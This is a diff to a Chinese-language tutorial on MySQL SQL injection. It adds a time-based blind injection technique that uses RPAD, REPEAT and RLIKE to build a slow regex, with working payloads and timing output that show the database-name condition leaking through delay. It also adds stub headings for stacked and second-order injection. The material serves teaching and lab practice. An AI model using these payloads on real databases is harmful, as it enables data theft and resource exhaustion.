@@ -481,6 +481,8 @@ SELECT BENCHMARK(1000000,1+1);
 
 3. 笛卡尔积
 
+可以大量消耗服务器资源
+
 ```
 SELECT count(*) FROM information_schema.columns;
 +----------+
@@ -529,7 +531,7 @@ select * from table3 where id='-1' or if (length(database())>1,(select count(*) 
 Time: 0.361s
 ```
 
-4. get_lock
+1. get_lock
 
 [https://dev.mysql.com/doc/refman/5.7/en/locking-functions.html](https://dev.mysql.com/doc/refman/5.7/en/locking-functions.html)
 
@@ -549,6 +551,69 @@ Time: 0.361s
 
 5. rpad/repeat
 
->对版本有要求
+构造恶意的正则匹配去消耗服务器资源,从而达到延时注入的目的
+
+[RPAD(str,len,padstr)](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_rpad)
+
+```
+mysql> SELECT RPAD('hi',5,'?');
+        -> 'hi???'
+mysql> SELECT RPAD('hi',1,'?');
+        -> 'h'
+```
+
+[REPEAT(str,count)](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_repeat)
+
+```
+mysql> SELECT REPEAT('MySQL', 3);
+        -> 'MySQLMySQLMySQL'
+```
+
+首先利用`repeat`或者`rpad`构造超长的待匹配字符串,然后再次利用这两个函数去构造正则匹配规则,利用匹配规则进行多次匹配(通过`repeat`中的数据量来控制延迟时间)
+
+```
+select rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',100),'b');
++-------------------------------------------------------------+
+| rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',100),'b') |
++-------------------------------------------------------------+
+| 0                                                           |
++-------------------------------------------------------------+
+1 row in set
+Time: 0.726s
+
+select rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',500),'b');
++-------------------------------------------------------------+
+| rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',500),'b') |
++-------------------------------------------------------------+
+| 0                                                           |
++-------------------------------------------------------------+
+1 row in set
+Time: 3.869s
+```
+
+```
+select * from table1 where id='1' or if(length(database())>1,rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',500),'b'),0);
++----+----------+----------+-----------------+
+| id | username | password | email           |
++----+----------+----------+-----------------+
+| 1  | admin    | admin!@# | admin@admin.org |
++----+----------+----------+-----------------+
+1 row in set
+Time: 3.297s
+select * from table1 where id='1' or if(length(database())<1,rpad('a',300000,'a') RLIKE concat(repeat('(a.*)+',500),'b'),0);
++----+----------+----------+-----------------+
+| id | username | password | email           |
++----+----------+----------+-----------------+
+| 1  | admin    | admin!@# | admin@admin.org |
++----+----------+----------+-----------------+
+1 row in set
+Time: 0.009s
+```
+
+### 堆叠注入
+
+即多语句执行,例题可以参照sqli-labs的Less-38
+
+### 二次注入
 
 >todo
